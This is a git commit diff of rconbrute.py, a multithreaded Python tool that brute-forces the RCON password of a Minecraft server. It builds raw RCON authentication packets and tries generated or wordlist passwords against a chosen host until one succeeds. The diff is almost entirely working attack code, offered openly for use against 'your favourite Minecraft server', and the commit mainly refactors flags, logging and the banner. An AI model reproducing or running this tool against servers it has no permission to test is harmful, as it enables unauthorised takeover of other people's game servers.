ec66ad1fb574bf4404523e0e2a01872731d1591f
antihack3r <49472785+antihack3r@users.noreply.github.com>
2024-07-27 21:54:31 +0300

    revision 1 (i got my account back yayy)

--- rconbrute.py
+++ rconbrute.py
@@ -1,20 +1,22 @@
-import argparse, itertools, socket, time, threading, signal, math, random
+#!/usr/bin/env python
+import argparse, itertools, socket, time, threading, math, random
 
 name = """
- ██▓███  ▓█████  ███▄    █  ██▓  ██████
-▓██░  ██▒▓█   ▀  ██ ▀█   █ ▓██▒▒██    ▒
-▓██░ ██▓▒▒███   ▓██  ▀█ ██▒▒██▒░ ▓██▄
-▒██▄█▓▒ ▒▒▓█  ▄ ▓██▒  ▐▌██▒░██░  ▒   ██▒
-▒██▒ ░  ░░▒████▒▒██░   ▓██░░██░▒██████▒▒
-▒▓▒░ ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▓  ▒ ▒▓▒ ▒ ░
-░▒ ░      ░ ░  ░░ ░░   ░ ▒░ ▒ ░░ ░▒  ░ ░
-░░          ░      ░   ░ ░  ▒ ░░  ░  ░
-            ░  ░         ░  ░        ░
+   ██████  ▄▄▄     ▓██   ██▓     ▄████ ▓█████ ▒██   ██▒
+ ▒██    ▒ ▒████▄    ▒██  ██▒    ██▒ ▀█▒▓█   ▀ ▒▒ █ █ ▒░
+ ░ ▓██▄   ▒██  ▀█▄   ▒██ ██░   ▒██░▄▄▄░▒███   ░░  █   ░
+   ▒   ██▒░██▄▄▄▄██  ░ ▐██▓░   ░▓█  ██▓▒▓█  ▄  ░ █ █ ▒ 
+ ▒██████▒▒ ▓█   ▓██▒ ░ ██▒▓░   ░▒▓███▀▒░▒████▒▒██▒ ▒██▒
+ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░  ██▒▒▒     ░▒   ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░
+ ░ ░▒  ░ ░  ▒   ▒▒ ░▓██ ░▒░      ░   ░  ░ ░  ░░░   ░▒ ░
+ ░  ░  ░    ░   ▒   ▒ ▒ ░░     ░ ░   ░    ░    ░    ░  
+       ░        ░  ░░ ░              ░    ░  ░ ░    ░  
+                    ░ ░        REVISION 1                          
 """
 
 class AtomicFlag:
     def __init__(self):
-        self.value = True
+        self.value = False
         self._lock = threading.Lock()
 
     def get(self):
@@ -23,39 +25,32 @@ class AtomicFlag:
 
     def set(self):
         with self._lock:
-            self.value = False
+            self.value = True
 
 counter = 0
-is_running = AtomicFlag()
+stopping = AtomicFlag()
 found = None
-
-def print_help_and_quit(argparser):
-	argparser.print_help()
-	raise SystemExit
 
 def int_to_le(value):
 	return value.to_bytes(4, 'little')
 
-def le_to_int(value):
-	return int.from_bytes(value, "little")
-
 def make_payload(password, id):
-	payload = int_to_le(id)
-	payload += int_to_le(3)
-	payload += password.encode('ascii')
-	payload += b'\x00\x00'
-	payload = int_to_le(len(payload)) + payload
+	payload = int_to_le(id) #unique request ID
+	payload += int_to_le(3) #packet ID for auth
+	payload += password.encode('ascii') #password
+	payload += b'\x00\x00' #two null bytes (one for the password, one for the packet)
+	payload = int_to_le(len(payload)) + payload #add packet size-
 	return payload
 
-def bruteforce(host, port, _passwords):
+def bruteforce(host, port, _passwords, verbose, thr_n):
 	global counter
-	global is_running
+	global stopping
 	global found
 	
 	for pwd in _passwords:
 		try:
 			counter += 1
-			if not is_running.get():
+			if stopping.get():
 				break
 			
 			id = random.randint(0, 59595995)
@@ -66,17 +61,18 @@ def bruteforce(host, port, _passwords):
 			con.connect((host, port))
 			con.sendall(payload)
 			
-			if le_to_int(con.recv(1024)[4:8]) == id:
+			if con.recv(1024)[4:8] != b'\xFF\xFF\xFF\xFF':
 				found = pwd
-				is_running.set()
+				stopping.set()
 				break
 			
 			con.close()
-		except Exception:
-			pass
+		except Exception as e:
+			if verbose:
+				print('[v] Thread {} reported an exception: {}'.format(thr_n, e))
 
 def ___quit():
-	is_running.set()
+	stopping.set()
 	try:
 		for thr in threads_list:
 			thr.join()
@@ -88,14 +84,20 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(
 					prog='rconbrute',
 					description='Bruteforce your favourite Minecraft server\'s RCON with this tool!',
-					epilog='made by antihack3r')
-	parser.add_argument('-H', '--host', default='localhost', help='Address of the RCON server (default is 0.0.0.0)')
-	parser.add_argument('-p', '--port', default=25575, type=int, help='Port of the RCON server (default is 25575)')
-	parser.add_argument('-t', '--threads', default=5, type=int, help='Number of bruteforcing threads (default is 5)')
-	parser.add_argument('-c', '--charset', default='1234567890', help='Charset to be used for generating passwords (default is 0-9)')
-	parser.add_argument('-l', '--password-len', default=6, type=int, help='Password length to be used for generating passwords (default is 6)')
-	parser.add_argument('--passwords', type=argparse.FileType('r'), help='File containing passwords to be used')
-	parser.add_argument('-v', '--verbose', action='store_true', help='Do more output')
+					epilog='--list has priority over --charset with --length')
+	parser.add_argument('-H', '--host', default='localhost',
+		help='address of the RCON server (default is 0.0.0.0)')
+	parser.add_argument('-p', '--port', default=25575, type=int,
+		help='port of the RCON server (default is 25575)')
+	parser.add_argument('-t', '--threads', default=5, type=int,
+		help='number of bruteforcing threads (default is 5)')
+	parser.add_argument('-c', '--charset', default='1234567890',
+		help='charset to be used for generating passwords (default is 0-9)')
+	parser.add_argument('-l', '--length', default=6, type=int,
+		help='password length to be used for generating passwords (default is 6)')
+	parser.add_argument('-L', '--list', type=argparse.FileType('r'),
+		help='file containing passwords to be used')
+	parser.add_argument('-v', '--verbose', action='store_true', help='do more output')
 	
 	parsed = vars(parser.parse_args())
 	
@@ -103,9 +105,21 @@ if __name__ == '__main__':
 	port = parsed['port']
 	threads = parsed['threads']
 	charset = parsed['charset']
-	password_len = parsed['password_len']
-	passwords = parsed['passwords']
+	password_len = parsed['length']
+	passwords = parsed['list']
 	verbose = parsed['verbose']
+	
+	print(name)
+	
+	print('[*] Will be attacking {}:{}'.format(host, port))
+	
+	if threads <= 0 or threads > 500:
+		print('[-] Please specify a reasonable amount of threads.')
+		raise SystemExit
+	
+	if password_len <= 0 or password_len > 100:
+		print('[-] Please specify a reasonable password length.')
+		raise SystemExit
 	
 	use_file = passwords != None
 	pwd_list = []
@@ -117,8 +131,6 @@ if __name__ == '__main__':
 		pwds = len(pwd_list)
 	else:
 		pwds = len(charset) ** password_len
-	
-	print(name)
 	
 	if use_file:
 		if verbose:
@@ -142,8 +154,8 @@ if __name__ == '__main__':
 		con.connect((host, port))
 		con.close()
 	except Exception:
-		prompt = input('[-] The server is DEAD. Continue anyway? (y/N)> ')
-		if prompt == '' or 'n' in prompt or 'N' in prompt:
+		prompt = input('[-] The server appears to be DEAD. Continue anyway? (y/N)> ')
+		if prompt == '' or 'y' not in prompt.lower():
 			raise SystemExit
 	else:
 		print('[+] Server is alive.')
@@ -151,6 +163,7 @@ if __name__ == '__main__':
 	last_verbose = time.time()
 	threads_list = []
 	
+	# this divides all passwords (somewhat) equally between threads
 	total_pwds_by_thread = math.floor(pwds / threads)
 	for i in range(threads):
 		sublist = None
@@ -163,16 +176,18 @@ if __name__ == '__main__':
 			sublist = pwd_list[:total_pwds_by_thread]
 			del pwd_list[:total_pwds_by_thread]
 		
-		threads_list.append(threading.Thread(target = bruteforce, args = (host, port, sublist[:])))
+		threads_list.append(threading.Thread(target = bruteforce, args = (
+			host, port, sublist[:], verbose, len(threads_list) + 1
+		)))
 	
 	for thr in threads_list:
 		thr.start()
 	
 	try:
-		while is_running.get():
+		while not stopping.get():
 			threads_list = [thr for thr in threads_list if thr.is_alive()]
 			if len(threads_list) == 0:
-				is_running.set()
+				stopping.set()
 		
 			if verbose and time.time() - last_verbose >= 1:
 				last_verbose = time.time()
@@ -181,10 +196,10 @@ if __name__ == '__main__':
 		print('[*] KeyboardInterrupt! Tested {} passwords ({}%).'.format(counter, round((counter / pwds) * 100)))
 		___quit()
 	
-	if not is_running.get():
+	if stopping.get():
 		if found != None:
-			print('[+] PASSWORD FOUND! > {} < [+]'.format(found))
+			print('[+] PASSWORD FOUND! > {} < Tested {} passwords.'.format(found, counter))
 		else:
-			print('[-] Password NOT FOUND! Tested {} passwords ({}%).'.format(counter, round((counter / pwds) * 100)))
+			print('[-] Password NOT FOUND! Tested {} passwords.'.format(counter))
 		
 		___quit()
